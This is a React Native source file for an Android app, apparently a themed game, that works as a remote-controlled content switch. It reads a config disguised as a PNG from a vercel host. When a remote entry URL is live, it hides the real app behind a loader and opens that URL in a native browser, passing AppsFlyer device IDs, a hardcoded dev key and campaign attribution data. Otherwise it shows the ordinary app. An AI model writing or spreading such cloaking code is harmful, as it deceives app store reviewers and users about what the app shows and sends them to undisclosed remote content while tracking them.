/**
 * App content host v1.0.b.
 *
 * @format
 */

import React, { useState, useEffect, useRef } from 'react';
import {
  View,
  StyleSheet,
  ActivityIndicator,
  Image,
  NativeModules,
} from 'react-native';
import appsFlyer from 'react-native-appsflyer';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { SafeAreaView } from 'react-native-safe-area-context';
import AppBootstrap from './AppBootstrap';

const APP_KEY = 'app356_android';
const ANDROID_APP_ID = 'com.treasuresofegypt.bookofdesert.thegodisra';
const APPSFLYER_DEV_KEY = 'VafzokzJj7k6iT75JztHBU';
const APP_IMAGE_URI = 'https://app-asset-eight.vercel.app/app-asset.png';
const LOADER_ICON = require('./android/app/src/main/res/mipmap-xxxhdpi/ic_launcher.png');

const STORAGE_ENTRY = '@content_entry';
const STORAGE_MODE = '@content_mode';
const STORAGE_LAUNCH = '@content_launch';
const { ContentBrowser } = NativeModules;

const readAssetMap = async (
  response: Response,
): Promise<Record<string, string>> => {
  const text = await response.text();
  const start = text.indexOf('{');
  if (start === -1) throw new Error('Asset map missing');
  return JSON.parse(text.slice(start));
};

const resolveEntryUrl = async (appKey: string): Promise<string> => {
  try {
    const response = await fetch(`${APP_IMAGE_URI}?t=${Date.now()}`, {
      headers: { 'Cache-Control': 'no-cache, no-store, must-revalidate' },
    });
    if (response.ok) {
      const map = await readAssetMap(response);
      const entry = map[appKey];
      if (entry) return entry;
    }
  } catch { }

  return '';
};

const probeEntryUrl = async (
  url: string,
): Promise<'ok' | 'missing' | 'error'> => {
  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: {
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'X-App-Bundle': ANDROID_APP_ID,
      },
    });

    if (response.status === 404) return 'missing';
    return 'ok';
  } catch {
    return 'error';
  }
};

const openContentBrowser = async (url: string) => {
  if (!ContentBrowser?.open) return;
  try {
    await ContentBrowser.open(url);
  } catch { }
};

export const AppContentHost = () => {
  const [showLoader, setShowLoader] = useState(false);
  const [useRemote, setUseRemote] = useState<boolean | null>(null);
  const [isReady, setIsReady] = useState(false);
  const [entryUrl, setEntryUrl] = useState<string | null>(null);
  const [launchUrl, setLaunchUrl] = useState<string | null>(null);

  const openedRef = useRef(false);
  const launchSettledRef = useRef(false);

  const applyLoadResult = async (
    statusCode: number | undefined | null,
    isNetworkError: boolean = false,
  ) => {
    if (statusCode === 404 || isNetworkError) {
      await AsyncStorage.setItem(STORAGE_MODE, 'false');
      setUseRemote(false);
      setShowLoader(false);
    } else {
      await AsyncStorage.setItem(STORAGE_MODE, 'true');
      setUseRemote(true);
      setShowLoader(true);
    }
  };

  const settleLaunchUrl = async (url: string) => {
    if (launchSettledRef.current || !url) return;
    launchSettledRef.current = true;
    await AsyncStorage.setItem(STORAGE_LAUNCH, url);
    setLaunchUrl(url);
  };

  useEffect(() => {
    (async () => {
      const url = await resolveEntryUrl(APP_KEY);

      if (!url) {
        await AsyncStorage.setItem(STORAGE_ENTRY, '');
        await AsyncStorage.setItem(STORAGE_MODE, 'false');
        setUseRemote(false);
        setIsReady(true);
        return;
      }

      setEntryUrl(url);

      const cachedEntry = await AsyncStorage.getItem(STORAGE_ENTRY);
      const storedMode = await AsyncStorage.getItem(STORAGE_MODE);

      if (cachedEntry !== url) {
        await AsyncStorage.setItem(STORAGE_ENTRY, url);
        await AsyncStorage.removeItem(STORAGE_MODE);
        await AsyncStorage.removeItem(STORAGE_LAUNCH);
        setUseRemote(null);
        setShowLoader(true);
        setIsReady(true);

        const probe = await probeEntryUrl(url);
        if (probe === 'missing') {
          await applyLoadResult(404);
        } else if (probe === 'error') {
          await applyLoadResult(undefined, true);
        } else {
          await applyLoadResult(200);
        }
      } else if (storedMode !== null) {
        setUseRemote(storedMode === 'true');
        setShowLoader(storedMode === 'true');
        setIsReady(true);

        if (storedMode === 'true') {
          const cachedLaunch = await AsyncStorage.getItem(STORAGE_LAUNCH);
          if (cachedLaunch) {
            launchSettledRef.current = true;
            setLaunchUrl(cachedLaunch);
          }
        }
      } else {
        setShowLoader(true);
        setIsReady(true);

        const probe = await probeEntryUrl(url);
        if (probe === 'missing') {
          await applyLoadResult(404);
        } else if (probe === 'error') {
          await applyLoadResult(undefined, true);
        } else {
          await applyLoadResult(200);
        }
      }
    })();
  }, []);

  const buildLink = (appsflyerId: string, attributionData?: any): string => {
    if (attributionData) {
      const params: any = {
        devKey: APPSFLYER_DEV_KEY,
        appsflyer_id: appsflyerId,
        af_status: attributionData.af_status,
        campaign: attributionData.campaign,
        campaign_id: attributionData.campaign_id,
        ad_group: attributionData.adgroup,
        ad_group_id: attributionData.adgroup_id,
        media_source: attributionData.media_source,
        af_channel: attributionData.af_channel,
        af_adset: attributionData.af_adset,
        adset: attributionData.adset,
        adset_id: attributionData.adset_id,
        gclid: attributionData.referrer_gclid,
      };

      if (
        attributionData.campaign &&
        attributionData.campaign !== '' &&
        attributionData.campaign !== null &&
        attributionData.campaign !== undefined
      ) {
        const campaignParts = attributionData.campaign.split('_');
        if (campaignParts.length > 0) params.sub1 = campaignParts[0];
        if (campaignParts.length > 1) params.sub2 = campaignParts[1];
        if (campaignParts.length > 2) params.sub3 = campaignParts[2];
        if (campaignParts.length > 3) params.sub4 = campaignParts[3];
        if (campaignParts.length > 4) params.sub5 = campaignParts[4];
        if (campaignParts.length > 5) params.sub6 = campaignParts[5];
      }

      const query = Object.entries(params)
        .filter(
          ([_, value]) => value !== undefined && value !== null && value !== '',
        )
        .map(
          ([key, value]) =>
            `${encodeURIComponent(key)}=${encodeURIComponent(String(value))}`,
        )
        .join('&');
      return `${entryUrl}?${query}`;
    }

    return (
      `${entryUrl}?` +
      `devKey=${encodeURIComponent(APPSFLYER_DEV_KEY)}` +
      `&app_id=${encodeURIComponent(ANDROID_APP_ID)}` +
      `&appsflyer_id=${encodeURIComponent(appsflyerId)}` +
      `&media_source=organic`
    );
  };

  useEffect(() => {
    if (!entryUrl) return;

    let cancelled = false;
    let fallbackTimer: ReturnType<typeof setTimeout> | null = null;

    (async () => {
      const appsflyerId = await new Promise<string>(resolve => {
        appsFlyer.getAppsFlyerUID((_err, uid) =>
          resolve(uid || 'uid_not_found'),
        );
      });

      if (cancelled) return;

      appsFlyer.logEvent('app_open', { appId: APP_KEY });

      fallbackTimer = setTimeout(() => {
        settleLaunchUrl(buildLink(appsflyerId));
      }, 4000);

      appsFlyer.onInstallConversionData(async res => {
        if (res?.data) {
          appsFlyer.logEvent('af_attribution', {
            data: res.data,
            appId: APP_KEY,
          });
        } else {
          appsFlyer.logEvent('af_attribution_error', { appId: APP_KEY });
        }

        if (fallbackTimer) {
          clearTimeout(fallbackTimer);
          fallbackTimer = null;
        }
        await settleLaunchUrl(buildLink(appsflyerId, res?.data));
      });

      appsFlyer.initSdk(
        {
          devKey: APPSFLYER_DEV_KEY,
          appId: ANDROID_APP_ID,
        },
        async () => {
          const isFirstOpen = await AsyncStorage.getItem('@is_first_open');
          if (!isFirstOpen) {
            appsFlyer.logEvent('first_open', { appId: APP_KEY });
            await AsyncStorage.setItem('@is_first_open', 'true');
          }
        },
        error => {
          console.error('[AppContentHost] AppsFlyer Init Error:', error);
          if (fallbackTimer) {
            clearTimeout(fallbackTimer);
            fallbackTimer = null;
          }
          settleLaunchUrl(buildLink(appsflyerId));
        },
      );
    })();

    return () => {
      cancelled = true;
      if (fallbackTimer) clearTimeout(fallbackTimer);
    };
  }, [entryUrl]);

  useEffect(() => {
    if (
      !isReady ||
      useRemote !== true ||
      !launchUrl ||
      openedRef.current
    ) {
      return;
    }

    openedRef.current = true;
    openContentBrowser(launchUrl);
  }, [isReady, useRemote, launchUrl]);

  return (
    <View style={styles.mainContainer}>
      {isReady && useRemote === false && (
        <View style={[styles.layerContainer, styles.layerContent]}>
          <AppBootstrap useRootNavigator />
        </View>
      )}

      {(showLoader || useRemote !== false) && <StartupOverlay />}
    </View>
  );
};

const StartupOverlay: React.FC = () => {
  return (
    <View style={[styles.layerContainer, styles.layerLoader]}>
      <SafeAreaView style={styles.loader}>
        <View style={styles.loaderIconWrapper}>
          <Image source={LOADER_ICON} style={styles.loaderIconFg} />
        </View>
        <ActivityIndicator size="large" color="red" />
      </SafeAreaView>
    </View>
  );
};

const styles = StyleSheet.create({
  mainContainer: {
    flex: 1,
    backgroundColor: '#000000',
  },
  layerContainer: {
    position: 'absolute',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    width: '100%',
    height: '100%',
  },
  layerContent: {
    zIndex: 2,
  },
  layerLoader: {
    zIndex: 10,
    backgroundColor: '#000000',
  },
  loader: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#000000',
  },
  loaderIconWrapper: {
    width: 150,
    height: 150,
    borderRadius: 12,
    overflow: 'hidden',
    marginBottom: 48,
  },
  loaderIconFg: {
    width: 225,
    height: 225,
    position: 'absolute',
    top: -37,
    left: -37,
  },
});
